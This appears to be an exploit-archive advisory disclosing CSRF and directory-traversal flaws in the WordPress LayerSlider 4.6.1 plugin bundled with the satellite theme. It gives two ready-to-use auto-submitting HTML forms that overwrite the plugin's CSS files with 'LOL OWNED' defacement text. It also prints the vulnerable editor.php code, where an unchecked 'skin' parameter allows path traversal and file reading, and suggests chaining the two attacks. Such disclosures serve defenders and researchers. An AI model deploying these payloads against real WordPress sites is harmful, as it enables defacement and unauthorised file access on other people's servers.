@@ -1,0 +1,170 @@
+id: 22012
+date: 03/11/2014
+title: WordPress LayerSlider 4.6.1 CSRF / Traversal Vulnerabilities
+author: AkaStep
+cves: 
+
+==========================================================
+Wordpress plugin LayerSlider WP Version 4.6.1 (Possible all versions) 
+suffers from CSRF And from Directory Traversal Vulnerabilities.
+
+AFAIK multiple wordpress themes uses this plugin.
+And one of them is  satellite - v1.0.2 wordpress theme.
+==========================================================
+
+Tested on:
+Server version: Apache/2.4.7 (Fedora)
+Server built:   Mar  3 2014 12:12:09
+
+$ php -v
+PHP 5.5.10 (cli) (built: Mar  5 2014 17:13:58) 
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+
+Wordpress 3.8.1 (Fresh install)
+
+Theme Default package: satellite - v1.0.2 + LayerSlider WP Version 4.6.1  (plugin)
+Note 1: (That vulnerable plugin LayerSlider WP Version 4.6.1 default comes with satellite - v1.0.2 WP theme).
+
+find `pwd`/ -name '*.zip'
+/var/www/hacker1.own/wp-content/themes/satellite/plugins/layersliderwp-4.6.1.installable.zip
+
+
+
+
+
+CSRF
+
+Defaced url can be found here: http://owned.tld/wp-content/uploads/layerslider.custom.css
+============CSRF 1======================================================
+
+<body onload="javascript:document.forms[0].submit()">
+<form action="http://owned.tld/wp-admin/admin.php?page=layerslider_style_editor&edited=1" method="post">
+<input type="hidden" name="posted_ls_styles_editor" value="1">
+<textarea rows="10" cols="50" name="contents" id="editor">LOL OWNED</textarea>
+</form>
+    
+    
+=========== CSRF 2=====================================================
+Defaced URL can be found here:
+
+http://owned.tld/wp-content/plugins/LayerSlider/skins/noskin/skin.css
+
+========================================================================
+<body onload="javascript:document.forms[0].submit()">
+<form action="http://owned.tld/wp-admin/admin.php?page=layerslider_skin_editor" method="post" class="inner">
+<input type="hidden" name="posted_ls_skin_editor" value="1">
+<textarea rows="10" cols="50" name="contents" id="editor">
+
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+LOL OWNED 
+
+
+</textarea>
+
+</form>
+=========================================================================
+
+Directory Traversal/This may lead also to Arbitrary code execution/Arbitrary File read
+(This can be combined with CSRF onfly and may cause successfull Happy Travel on server.)
+
+[blackhat@localhost] LayerSlider]# pwd && cat -b editor.php 
+/var/www/hacker1.own/wp-content/plugins/LayerSlider
+     1  <?php
+
+     2    // Skin
+     3    if(isset($_GET['skin']) && !empty($_GET['skin'])) {
+     4      $skin = $_GET['skin'];
+     5    } else {
+
+     6      // Open folder
+     7      $handle = opendir(dirname(__FILE__) . '/skins');
+
+     8      // Iterate over the contents
+     9      while (false !== ($entry = readdir($handle))) {
+    10        if($entry == '.' || $entry == '..' || $entry == 'preview') {
+    11          continue;
+    12        } else {
+    13          $skin = $entry;
+    14          break;
+    15        }
+    16      }
+    17    }
+
+    18    // File
+    19    $file = dirname(__FILE__) . '/skins/' . $skin . '/skin.css';
+    20  ?>
+
+    21  <div class="wrap">
+
+    22    <!-- Page title -->
+    23    <div class="ls-icon-layers"></div>
+    24    <h2>
+    25      <?php _e('LayerSlider Skin Editor', 'LayerSlider') ?>
+    26      <a href="?page=layerslider" class="add-new-h2"><?php _e('Back to the list', 'LayerSlider') ?></a>
+    27    </h2>
+
+    28    <?php if(isset($_GET['edited'])) : ?>
+    29    <div class="updated"><?php _e('Your changes has been saved!', 'LayerSlider') ?></div>
+    30    <?php  endif; ?>
+
+    31    <!-- Editor box -->
+    32    <div class="ls-box ls-skin-editor-box">
+    33      <h3 class="header">
+    34        <?php _e('Skin Editor', 'LayerSlider') ?>
+    35        <p>
+    36          <span><?php _e('Choose a skin:', 'LayerSlider') ?></span>
+    37          <select name="skin" class="ls-skin-editor-select">
+    38            <?php $handle = opendir(dirname(__FILE__) . '/skins'); ?>
+    39            <?php while (false !== ($entry = readdir($handle))) : ?>
+    40            <?php if($entry == '.' || $entry == '..' || $entry == 'preview') continue; ?>
+    41            <?php if($entry == $skin) { ?>
+    42            <option selected="selected"><?php echo $entry ?></option>
+    43            <?php } else { ?>
+    44            <option><?php echo $entry ?></option>
+    45            <?php } ?>
+    46            <?php endwhile; ?>
+    47            <?php closedir($handle); ?>
+    48          </select>
+    49        </p>
+    50      </h3>
+    51      <form action="<?php echo $_SERVER['REQUEST_URI'] ?>" method="post" class="inner">
+    52        <input type="hidden" name="posted_ls_skin_editor" value="1">
+    53        <textarea rows="10" cols="50" name="contents" id="editor"><?php echo file_get_contents($file); ?></textarea>
+    54        <p>
+    55          <?php if(!is_writable($file)) { ?>
+    56          <?php _e('You need to make this file writable before you can save your changes. See the <a href="http://codex.wordpress.org/Changing_File_Permissions" target="_blank">Codex</a> for more information.', 'LayerSlider') ?>
+    57          <?php } else { ?>
+    58          <button class="button-primary"><?php _e('Save changes', 'LayerSlider') ?></button>
+    59          <?php _e("Modifying a skin could be dangerous, these changes will be permanent, you can't revert it.", "LayerSlider") ?>
+    60          <?php } ?>
+    61        </p>
+    62      </form>
+    63    </div>
+    64  </div>
+[blackhat@localhost LayerSlider]#
+
+#  0day.today [2023-03-25]  #
